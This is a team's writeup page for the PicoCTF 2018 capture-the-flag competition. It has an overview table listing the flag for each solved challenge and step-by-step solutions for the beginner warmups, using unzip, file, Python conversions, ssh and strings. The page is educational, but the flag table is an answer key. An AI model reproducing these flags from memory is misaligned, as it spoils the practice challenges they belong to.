<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="PicoCTF 2018" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups by team Galaxians." /><meta property="og:description" content="A set of CTF writeups by team Galaxians." /><link rel="canonical" href="https://shiltemann.github.io/CTF-writeups-public/writeups/PicoCTF_2018/" /><meta property="og:url" content="https://shiltemann.github.io/CTF-writeups-public/writeups/PicoCTF_2018/" /><meta property="og:site_name" content="Galaxians CTF" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-09-28T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PicoCTF 2018" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-20T17:00:52+02:00","datePublished":"2018-09-28T00:00:00+02:00","description":"A set of CTF writeups by team Galaxians.","headline":"PicoCTF 2018","mainEntityOfPage":{"@type":"WebPage","@id":"https://shiltemann.github.io/CTF-writeups-public/writeups/PicoCTF_2018/"},"url":"https://shiltemann.github.io/CTF-writeups-public/writeups/PicoCTF_2018/"}</script><title> Galaxians CTF | PicoCTF 2018</title><link rel="apple-touch-icon" sizes="180x180" href="/CTF-writeups-public/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/CTF-writeups-public/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/CTF-writeups-public/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/CTF-writeups-public/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/CTF-writeups-public/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Galaxians CTF"><meta name="application-name" content="Galaxians CTF"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/CTF-writeups-public/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/CTF-writeups-public/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/CTF-writeups-public/" class="mx-auto"> <img src="/CTF-writeups-public/assets/img/galaxians-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/CTF-writeups-public/">Galaxians CTF</a></div><div class="site-subtitle font-italic">Galactic Girlfiends Hack the Universe!</div></div><ul class="w-100"><li class="nav-item"> <a href="/CTF-writeups-public/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/posts/" class="nav-link"> <i class="fa-fw fas fa-pencil ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/shiltemann" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['galaxians','galaxians.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/CTF-writeups-public/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/CTF-writeups-public/"> Home </a> </span> <span>PicoCTF 2018</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Ctf-event</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> PicoCTF 2018</h1><div class="post-content"><h1>Overview</h1><div class="table-wrapper"><div class="table-wrapper"><table><thead><tr><th>Challenge<th>Points<th>Category<th>Flag<tbody><tr><td><a href="#forensics-50-forensics-warmup-1">Forensics 50: Forensics Warmup 1</a><td><td><td><code>picoCTF{welcome_to_forensics}</code><tr><td><a href="#forensics-50-forensics-warmup-2">Forensics 50: Forensics Warmup 2</a><td><td><td><code>picoCTF{extensions_are_a_lie}</code><tr><td><a href="#general-skills-50-warmup-1">General Skills 50: Warmup 1</a><td><td><td><code>picoCTF{A}</code><tr><td><a href="#general-skills-50-warmup-2">General Skills 50: Warmup 2</a><td><td><td><code>picoCTF{11011}</code><tr><td><a href="#general-skills-50-warmup-3">General Skills 50: Warmup 3</a><td><td><td><code>picoCTF{61}</code><tr><td><a href="#general-skills-50-resources">General Skills 50: Resources</a><td><td><td><code>picoCTF{xiexie_ni_lai_zheli}</code><tr><td><a href="#reversing-50-reversing-warmup-1">Reversing 50: Reversing Warmup 1</a><td><td><td><code>picoCTF{welc0m3_t0_r3VeRs1nG}</code><tr><td><a href="#reversing-50-reversing-warmup-2">Reversing 50: Reversing Warmup 2</a><td><td><td><code>picoCTF{th4t_w4s_s1mpL3}</code><tr><td><a href="#cryptography-75-crypto-warmup-1">Cryptography 75: Crypto Warmup 1</a><td><td><td><code>picoCTF{SECRETMESSAGE}</code><tr><td><a href="#cryptography-75-crypto-warmup-2">Cryptography 75: Crypto Warmup 2</a><td><td><td><code>picoCTF{this_is_crypto!}</code><tr><td><a href="#general-skills-75-grep-1">General Skills 75: grep 1</a><td><td><td><code>picoCTF{grep_and_you_will_find_c709fa94}</code><tr><td><a href="#general-skills-75-net-cat">General Skills 75: net cat</a><td><td><td><code>picoCTF{NEtcat_iS_a_NEcESSiTy_8b6a1fbc}</code><tr><td><a href="#cryptography-100-heeeeeeere-s-johnny">Cryptography 100: HEEEEEEERE’S Johnny!</a><td><td><td><code>picoCTF{J0hn_1$_R1pp3d_1b25af80}</code><tr><td><a href="#general-skills-100-strings">General Skills 100: strings</a><td><td><td><code>picoCTF{sTrIngS_sAVeS_Time_d3ffa29c}</code><tr><td><a href="#general-skills-110-pipe">GEneral Skills 110: pipe</a><td><td><td><code>picoCTF{almost_like_mario_b797f2b3}</code><tr><td><a href="#web-exploitation-125-inspect-me">Web Exploitation 125: Inspect Me</a><td><td><td><code>picoCTF{ur_4_real_1nspect0r_g4dget_b4887011}</code><tr><td><a href="#general-skills-125-grep-2">General Skills 125: grep 2</a><td><td><td><code>picoCTF{grep_r_and_you_will_find_8eb84049}</code><tr><td><a href="#general-skills-150-aca-shell-a">General Skills 150: Aca-Shell-A</a><td><td><td> unsolved<tr><td><a href="#web-exploitation-150-client-side-is-still-bad">Web Exploitation 150: Client Side is Still Bad</a><td><td><td><code>picoCTF{client_is_bad_040594}</code><tr><td><a href="#forensics-150-desrouleaux">Forensics 150: Desrouleaux</a><td><td><td><code>picoCTF{J4y_s0n_d3rUUUULo_b6cacd6c}</code><tr><td><a href="#web-exploitation-150-logon">Web Exploitation 150: Logon</a><td><td><td><code>picoCTF{l0g1ns_ar3nt_r34l_2a968c11}</code><tr><td><a href="#forensics-150-reading-between-the-eyes">Forensics 150: Reading between the Eyes</a><td><td><td><code>picoCTF{r34d1ng_b37w33n_7h3_by73s}</code><tr><td><a href="#forensics-150-recovering-from-the-snap">Forensics 150: Recovering from the snap</a><td><td><td><code>picoCTF{th3_5n4p_happ3n3d}</code><tr><td><a href="#forensics-150-admin-panel">Forensics 150: admin panel</a><td><td><td><code>picoCTF{n0ts3cur3_894a6546}</code><tr><td><a href="#reversing-150-assembly-0">Reversing 150: assembly-0</a><td><td><td> unsolved<tr><td><a href="#binary-exploitation-150-buffer-overflow-0">Binary Exploitation 150: buffer overflow 0</a><td><td><td><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}</code><tr><td><a href="#cryptography-150-caesar-cipher-1">Cryptography 150: caesar cipher 1</a><td><td><td><code>picoCTF{justagoodoldcaesarcipherwoyolfpu}</code><tr><td><a href="#general-skills-150-environ">General Skills 150: environ</a><td><td><td><code>picoCTF{eNv1r0nM3nT_v4r14Bl3_fL4g_3758492}</code><tr><td><a href="#cryptography-150-hertz">Cryptography 150: hertz</a><td><td><td> unsolved<tr><td><a href="#forensics-150-hex-editor">Forensics 150: hex editor</a><td><td><td><code>picoCTF{and_thats_how_u_edit_hex_kittos_3E03e57d}</code><tr><td><a href="#general-skills-150-ssh-keyz">General Skills 150: ssh-keyz</a><td><td><td><code>picoCTF{who_n33ds_p4ssw0rds_38dj21}</code><tr><td><a href="#web-exploitation-200-irish-name-repo">Web Exploitation 200: Irish Name Repo</a><td><td><td><code>picoCTF{con4n_r3411y_1snt_1r1sh_f58843c5}</code><tr><td><a href="#web-exploitation-200-mr-robots">Web Exploitation 200: Mr. Robots</a><td><td><td><code>picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_30de1}</code><tr><td><a href="#web-exploitation-200-no-login">Web Exploitation 200: No login</a><td><td><td><code>picoCTF{n0l0g0n_n0_pr0bl3m_50e16a5c}</code><tr><td><a href="#web-exploitation-200-secret-agent">Web Exploitation 200: Secret Agent</a><td><td><td><code>picoCTF{s3cr3t_ag3nt_m4n_134ecd62}</code><tr><td><a href="#forensics-200-truly-an-artist">Forensics 200: Truly an Artist</a><td><td><td><code>picoCTF{look_in_image_788a182e}</code><tr><td><a href="#reversing-200-assembly-1">Reversing 200: assembly-1</a><td><td><td> unsolved<tr><td><a href="#reversing-200-be-quick-or-be-dead-1">Reversing 200: be-quick-or-be-dead-1</a><td><td><td><code>picoCTF{why_bother_doing_unnecessary_computation_27f28e71}</code><tr><td><a href="#cryptography-200-blaise-s-cipher">Cryptography 200: blaise’s cipher</a><td><td><td><code>picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0}</code><tr><td><a href="#binary-exploitation-200-buffer-overflow-1">Binary Exploitation 200: buffer overflow 1</a><td><td><td><code>picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault</code><tr><td><a href="#cryptography-200-hertz-2">Cryptography 200: hertz 2</a><td><td><td><code>picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo}</code><tr><td><a href="#binary-exploitation-200-leak-me">Binary Exploitation 200: leak-me</a><td><td><td><code>picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}</code><tr><td><a href="#forensics-200-now-you-don-t">Forensics 200: now you don’t</a><td><td><td><code>picoCTF{n0w_y0u_533_m3}</code><tr><td><a href="#reversing-200-quackme">Reversing 200: quackme</a><td><td><td><code>picoCTF{qu4ckm3_9bcb819e}</code><tr><td><a href="#binary-exploitation-200-shellcode">Binary Exploitation 200: shellcode</a><td><td><td><code>picoCTF{shellc0de_w00h00_9ee0edd0}</code><tr><td><a href="#general-skills-200-what-base-is-this">General Skills 200: what base is this?</a><td><td><td><code>picoCTF{delusions_about_finding_values_602fd280}</code><tr><td><a href="#general-skills-200-you-can-t-see-me">General Skills: 200: you can’t see me</a><td><td><td><code>picoCTF{j0hn_c3na_paparapaaaaaaa_paparapaaaaaa_22f627d9}</code><tr><td><a href="#web-exploitation-250-buttons">Web Exploitation 250: Buttons</a><td><td><td><code>picoCTF{button_button_whose_got_the_button_ed306c10}</code><tr><td><a href="#forensics-250-ext-super-magic">Forensics 250: Ext Super Magic</a><td><td><td><code>picoCTF{a7DB29eCf7dB9960f0A19Fdde9d00Af0}</code><tr><td><a href="#forensics-250-lying-out">Forensics 250: Lying out</a><td><td><td><code>picoCTF{w4y_0ut_ff5bd19c}</code><tr><td><a href="#cryptography-250-safe-rsa">Cryptography 250: Safe RSA</a><td><td><td><code>picoCTF{e_w4y_t00_sm411_81b6559f}</code><tr><td><a href="#web-exploitation-250-the-vault">Web Exploitation 250: The Vault</a><td><td><td><code>picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}</code><tr><td><a href="#forensics-250-what-s-my-name">Forensics 250: What’s My Name?</a><td><td><td><code>picoCTF{w4lt3r_wh1t3_2d6d3c6c75aa3be7f42debed8ad16e3b}</code><tr><td><a href="#general-skills-250-absolutely-relative">General Skills 250: absolutely relative</a><td><td><td><code>picoCTF{3v3r1ng_1$_r3l3t1v3_a97be50e}</code><tr><td><a href="#reversing-250-assembly-2">Reversing 250: assembly-2</a><td><td><td> unsolved<tr><td><a href="#binary-exploitation-250-buffer-overflow-2">Binary Exploitation 250: buffer overflow 2</a><td><td><td><code>picoCTF{addr3ss3s_ar3_3asy1b78b0d8}</code><tr><td><a href="#cryptography-250-caesar-cipher-2">Cryptography 250: caesar cipher 2</a><td><td><td><code>picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE}</code><tr><td><a href="#binary-exploitation-250-got-2-learn-libc">Binary Exploitation 250: got-2-learn-libc</a><td><td><td> unsolved<tr><td><a href="#cryptography-250-rsa-madlibs">Cryptography 250: rsa-madlibs</a><td><td><td><code>picoCTF{d0_u_kn0w_th3_w@y_2_RS@_5d383e10}</code><tr><td><a href="#reversing-275-be-quick-or-be-dead-2">Reversing 275: be-quick-or-be-dead-2</a><td><td><td> unsolved<tr><td><a href="#general-skills-275-in-out-error">General Skills 275: in out error</a><td><td><td><code>picoCTF{p1p1ng_1S_4_7h1ng_b6f5a788}</code><tr><td><a href="#web-exploitation-300-artisinal-handcrafted-http-3">Web Exploitation 300: Artisinal Handcrafted HTTP 3</a><td><td><td><code>picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_72f2}</code><tr><td><a href="#cryptography-300-spyfi">Cryptography 300: SpyFi</a><td><td><td><code>picoCTF{@g3nt6_1$_th3_c00l3$t_3355197}</code><tr><td><a href="#binary-exploitation-300-echooo">Binary Exploitation 300: echooo</a><td><td><td><code>picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae}</code><tr><td><a href="#general-skills-300-learn-gdb">General Skills 300: learn gdb</a><td><td><td><code>picoCTF{gDb_iS_sUp3r_u53fuL_66d5464d}</code><tr><td><a href="#web-exploitation-350-flaskcards">Web Exploitation 350: Flaskcards</a><td><td><td><code>picoCTF{secret_keys_to_the_kingdom_e8a55760}</code><tr><td><a href="#cryptography-350-super-safe-rsa">Cryptography 350: Super Safe RSA</a><td><td><td><code>picoCTF{us3_l@rg3r_pr1m3$_1850}</code><tr><td><a href="#binary-exploitation-250-authenticate">Binary Exploitation 250: authenticate</a><td><td><td> unsolved<tr><td><a href="#forensics-350-core">Forensics 350: core</a><td><td><td><code>picoCTF{abb6a3b2603654804ed357322c760510}</code><tr><td><a href="#binary-exploitation-350-got-shell">Binary Exploitation 350: got-shell?</a><td><td><td> unsolved<tr><td><a href="#binary-exploitation-250-rop-chain">Binary Exploitation 250: rop chain</a><td><td><td> unsolved<tr><td><a href="#general-skills-350-roulette">General Skills 350: roulette</a><td><td><td> unsolved<tr><td><a href="#forensics-400-malware-shops">Forensics 400: Malware Shops</a><td><td><td><code>picoCTF{w4y_0ut_dea1794b}</code><tr><td><a href="#reversing-400-radix-s-terminal">Reversing 400: Radix’s Terminal</a><td><td><td><code>picoCTF{bAsE_64_eNCoDiNg_iS_EAsY_41799451}</code><tr><td><a href="#reversing-400-assembly-3">Reversing 400: assembly-3</a><td><td><td> unsolved<tr><td><a href="#cryptography-400-electric">Cryptography 400: eleCTRic</a><td><td><td><code>picoCTF{alw4ys_4lways_Always_check_int3grity_c469e9ba}</code><tr><td><a href="#web-exploitation-400-fancy-alive-monitoring">Web Exploitation 400: fancy-alive-monitoring</a><td><td><td> unsolved<tr><td><a href="#reversing-400-keygen-me-1">Reversing 400: keygen-me-1</a><td><td><td> unsolved<tr><td><a href="#general-skills-400-store">General Skills 400: Store</a><td><td><td><code>picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}</code><tr><td><a href="#cryptography-450-super-safe-rsa-2">Cryptography 450: Super Safe RSA 2</a><td><td><td><code>picoCTF{w@tch_y0ur_Xp0n3nt$_c@r3fu11y_6498999}</code><tr><td><a href="#cryptography-450-magic-padding-oracle">Cryptography 450: Magic Padding Oracle</a><td><td><td> unsolved<tr><td><a href="#binary-exploitation-450-buffer-overflow-3">Binary Exploitation 450: buffer overflow 3</a><td><td><td> unsolved<tr><td><a href="#web-exploitation-500-secure-logon">Web Exploitation 500: Secure Logon</a><td><td><td><code>picoCTF{fl1p_4ll_th3_bit3_a6396679}</code><tr><td><a href="#general-skills-500-script-me">General Skills 500: script me</a><td><td><td> unsolved<tr><td><a href="#forensics-550-loadsomebits">Forensics 550: LoadSomeBits</a><td><td><td><code>picoCTF{st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_882756901}</code><tr><td><a href="#reversing-550-assembly-4">Reversing 550: assembly-4</a><td><td><td><code>picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_94698637933</code><tr><td><a href="#web-exploitation-600-flaskcards-skeleton-key">Web Exploitation 600: Flaskcards Skeleton key</a><td><td><td><code>picoCTF{1_id_to_rule_them_all_d77c1ed6}</code><tr><td><a href="#web-exploitation-600-help-me-reset">Web Exploitation 600: Help Me Reset</a><td><td><td><code>picoCTF{i_thought_i_could_remember_those_34745314}</code><tr><td><a href="#super-safe-rsa-3">Super Safe RSA 3</a><td>600<td>crypto<td><code>picoCTF{p_&_q_n0_r_$_t!!_6629910}</code><tr><td><a href="#special-pw">special-pw</a><td>600<td>reversing<td> unsolved<tr><td><a href="#a-simple-question">A Simple Question</a><td>650<td>web<td><code>picoCTF{qu3stions_ar3_h4rd_d3850719}</code><tr><td><a href="#cryptography-700-james-brahm-returns">Cryptography 700: James Brahm Returns</a><td>700<td>crypto<td> unsolved<tr><td><a href="#lambdash-3">LambDash 3</a><td>800<td>web<td> unsolved<tr><td><a href="#dog-or-frog">Dog or Frog</a><td>900<td>general<td> unsolved<tr><td><a href="#flaskcards-and-freedom">Flaskcards and Freedom</a><td>900<td>web<td><code>picoCTF{R_C_E_wont_let_me_be_85e92c3a}</code></table></div></div><h1 id="forensics-50-forensics-warmup-1"> Forensics 50: Forensics Warmup 1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/00-forensics-50-forensics-warmup-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you unzip <a href="writeupfiles/flag.zip">this file</a> for me and retreive the flag?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>we unzip to find an image:</p><p><img src="writeupfiles/flag.jpg" alt="" /></p><h2> Flag</h2><code> picoCTF{welcome_to_forensics} </code><hr><h1 id="forensics-50-forensics-warmup-2"> Forensics 50: Forensics Warmup 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/01-forensics-50-forensics-warmup-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Hmm for some reason I can’t open <a href="writeupfiles/flag.png">this PNG</a>? Any ideas?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Turns out the file isn’t actually a png file (though gimp will open it even with<br /> the wrong extension)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file flag.png
flag.png: JPEG image data, JFIF standard 1.01, resolution <span class="o">(</span>DPI<span class="o">)</span>, density 75x75, segment length 16, baseline, precision 8, 909x190, frames 3
</pre></table></code></div></div><p><img src="writeupfiles/flag2.jpg" alt="" /></p><h2> Flag</h2><code> picoCTF{extensions_are_a_lie} </code><hr><h1 id="general-skills-50-warmup-1"> General Skills 50: Warmup 1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/02-general-skills-50-warmup-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If I told you your grade was <code class="language-plaintext highlighter-rouge">0x41</code> in hexadecimal, what would it be in ASCII?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="sh">'</span><span class="s">41</span><span class="sh">'</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span>
<span class="sh">'</span><span class="s">A</span><span class="sh">'</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{A} </code><hr><h1 id="general-skills-50-warmup-2"> General Skills 50: Warmup 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/03-general-skills-50-warmup-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="nf">bin</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>
<span class="sh">'</span><span class="s">0b11011</span><span class="sh">'</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{11011} </code><hr><h1 id="general-skills-50-warmup-3"> General Skills 50: Warmup 3 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/04-general-skills-50-warmup-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What is 0x3D (base 16) in decimal (base 10).</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="nf">int</span><span class="p">(</span><span class="sh">'</span><span class="s">3D</span><span class="sh">'</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
<span class="mi">61</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{61} </code><hr><h1 id="general-skills-50-resources"> General Skills 50: Resources <a href="/CTF-writeups-public/writeups/PicoCTF_2018/05-general-skills-50-resources.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We put together a bunch of resources to help you out on our website! If you go over there,<br /> you might even find a flag! https://picoctf.com/resources</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>flag was just written on the page</p><h2> Flag</h2><code> picoCTF{xiexie_ni_lai_zheli} </code><hr><h1 id="reversing-50-reversing-warmup-1"> Reversing 50: Reversing Warmup 1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/06-reversing-50-reversing-warmup-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Throughout your journey you will have to run many programs. Can you navigate to<br /> <code class="language-plaintext highlighter-rouge">/problems/reversing-warmup-1_0_f99f89de33522c93964bdec49fb2b838</code> on the shell server<br /> and run <a href="writeupfiles/run">this program</a> to retreive the flag?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh ysje@2018shell1.picoctf.com
picoCTF<span class="o">{</span>who_n33ds_p4ssw0rds_38dj21<span class="o">}</span>
Welcome ysje!
Your shell server account has been created.
Please press enter and reconnect.
</pre></table></code></div></div><p>We see a flag there but its not for this challenge</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /problems/reversing-warmup-1_0_f99f89de33522c93964bdec49fb2b838
<span class="nv">$ </span>./run
picoCTF<span class="o">{</span>welc0m3_t0_r3VeRs1nG<span class="o">}</span>
</pre></table></code></div></div><p>or</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings run | <span class="nb">grep </span>picoCTF
picoCTF<span class="o">{</span>welc0m3_t0_r3VeRs1nG<span class="o">}</span>
